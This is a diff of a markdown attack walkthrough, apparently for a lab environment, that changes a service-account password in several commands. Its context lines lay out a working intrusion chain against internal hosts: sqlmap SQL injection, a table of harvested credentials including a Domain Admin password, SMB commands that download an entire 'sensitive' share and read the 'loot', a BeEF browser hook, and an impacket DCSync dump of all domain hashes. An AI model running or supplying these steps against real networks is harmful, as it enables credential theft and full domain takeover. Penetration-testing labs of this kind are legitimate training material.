@@ -47,20 +47,20 @@ sqlmap -u "http://172.16.0.100/employees/?search=test" \
 |------|----------|
 | jsmith | Summer2024 |
 | mwilliams | Welcome123 |
-| svc_backup | Backup2024! |
+| svc_backup | Backup2024 |
 
 ---
 
 ## Phase 3: Lateral Movement (SMB)
 ```bash
 # List shares
-smbclient -L //172.16.2.20 -U svc_backup%Backup2024!
+smbclient -L //172.16.2.20 -U svc_backup%Backup2024
 
 # Access sensitive share
-smbclient //172.16.2.20/sensitive -U svc_backup%Backup2024!
+smbclient //172.16.2.20/sensitive -U svc_backup%Backup2024
 
 # Download everything
-smbget -R smb://172.16.2.20/sensitive -U svc_backup%Backup2024!
+smbget -R smb://172.16.2.20/sensitive -U svc_backup%Backup2024
 
 # Read the loot
 cat passwords.txt
@@ -87,7 +87,7 @@ Wait for victim browser to appear in BeEF console.
 ## Phase 5: DCSync Attack
 ```bash
 # Dump all domain hashes
-impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024!@172.16.2.10'
+impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024@172.16.2.10'
 ```
 
 ---
@@ -123,7 +123,7 @@ SQLi → Creds → SMB → Files → Domain Admin
 |---------|----------|--------|
 | jsmith | Summer2024 | AD User, SMB |
 | mwilliams | Welcome123 | AD User, Accounting share |
-| svc_backup | Backup2024! | AD User, Sensitive share, **DCSync** |
+| svc_backup | Backup2024 | AD User, Sensitive share, **DCSync** |
 | Administrator | Adm1n2024! | **Domain Admin** |
 
 ---
@@ -144,7 +144,7 @@ nmap -p 445 172.16.2.20
 **DCSync fails?**
 ```bash
 # Verify creds work
-impacket-smbclient 'acmewidgets.local/svc_backup:Backup2024!@172.16.2.10'
+impacket-smbclient 'acmewidgets.local/svc_backup:Backup2024@172.16.2.10'
 ```
 
 **BeEF hook not loading?**
